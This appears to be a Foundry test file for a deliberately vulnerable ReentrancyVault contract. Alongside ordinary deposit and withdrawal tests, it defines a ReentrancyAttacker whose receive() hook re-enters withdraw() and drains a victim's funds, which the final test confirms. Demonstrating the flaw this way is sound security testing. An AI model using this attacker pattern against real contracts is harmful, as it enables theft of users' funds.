pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReentrancyVault} from "../src/ReentrancyVault.sol";

contract ReentrancyAttacker {
    ReentrancyVault public vault;
    uint256 public attackAmount;
    bool public reentered;

    constructor(address payable _vault) {
        vault = ReentrancyVault(_vault);
    }

    function attack() external payable {
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (!reentered && address(vault).balance >= attackAmount) {
            reentered = true;
            vault.withdraw();
        }
    }
}

contract Rejector {
    ReentrancyVault public vault;

    constructor(address payable _vault) {
        vault = ReentrancyVault(_vault);
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdraw() external {
        vault.withdraw();
    }

    // No receive or fallback, so ETH transfer fails
}

contract ReentrancyVaultTest is Test {
    ReentrancyVault public vault;
    address public user = address(0x123);

    function setUp() public {
        vault = new ReentrancyVault();
        vm.deal(user, 100 ether);
    }

    function test_Deposit() public {
        vm.prank(user);
        vault.deposit{value: 5 ether}();
        assertEq(vault.balances(user), 5 ether);
        assertEq(vault.totalHeld(), 5 ether);
    }

    function testFuzz_Deposit(uint96 amount) public {
        vm.deal(user, uint256(amount));
        vm.prank(user);
        vault.deposit{value: amount}();
        assertEq(vault.balances(user), amount);
        assertEq(vault.totalHeld(), amount);
    }

    function test_Withdraw_Success() public {
        vm.prank(user);
        vault.deposit{value: 2 ether}();

        uint256 balanceBefore = user.balance;
        vm.prank(user);
        vault.withdraw();

        assertEq(vault.balances(user), 0);
        assertEq(user.balance, balanceBefore + 2 ether);
        assertEq(vault.totalHeld(), 0);
    }

    function test_Withdraw_RevertNothingToWithdraw() public {
        vm.prank(user);
        vm.expectRevert("nothing to withdraw");
        vault.withdraw();
    }

    function test_Withdraw_RevertTransferFailed() public {
        Rejector rejector = new Rejector(payable(address(vault)));
        vm.deal(address(rejector), 1 ether);

        rejector.deposit{value: 1 ether}();

        vm.expectRevert("transfer failed");
        rejector.withdraw();
    }

    function test_ReentrancyVulnerability() public {
        // Setup victim funds in vault
        vm.prank(user);
        vault.deposit{value: 10 ether}();

        // Setup attacker
        ReentrancyAttacker attacker = new ReentrancyAttacker(payable(address(vault)));
        vm.deal(address(attacker), 2 ether);

        // Execute attack
        attacker.attack{value: 2 ether}();

        // Attacker drained more than deposited due to reentrancy
        assertTrue(attacker.reentered());
        assertEq(address(attacker).balance, 6 ether);
        assertEq(vault.totalHeld(), 8 ether);
    }
}
